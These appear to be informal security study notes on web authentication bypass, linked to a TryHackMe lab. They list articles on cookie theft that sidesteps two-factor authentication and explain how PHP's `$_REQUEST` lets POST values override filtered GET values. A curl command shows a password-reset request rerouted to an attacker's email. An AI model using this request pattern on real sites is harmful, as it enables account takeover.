Display generic errors
Maybe smth about %20...

Cookies
https://www.databreaches.net/hackers-are-using-cookies-to-sidestep-two-factor-authentication/
https://www.thewindowsclub.com/cookie-stealing-or-scraping
https://thehackernews.com/2021/10/hackers-stealing-browser-cookies-to.html
https://www.kirsle.net/wizards/flask-session.cgi
https://tryhackme.com/room/authenticationbypass

---
Random

<p>

If a server is filtering `$_GET`, but uses `$_REQUEST` <small>(merge of GET, and POST, if there are duplicate entries, POST take prevalence)</small>. It looks kinda special, and I hope there is no developer doing that.
</p>
$_REQUEST=$_GET+$_POST. If both have a key, then post is used.
GET url with non-injectable parameter (verified)
POST URL in which you can override the value of the non-injectable parameter
curl 'http://10.10.136.157/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=hacker@hack.ca'
https://tryhackme.com/room/authenticationbypass
---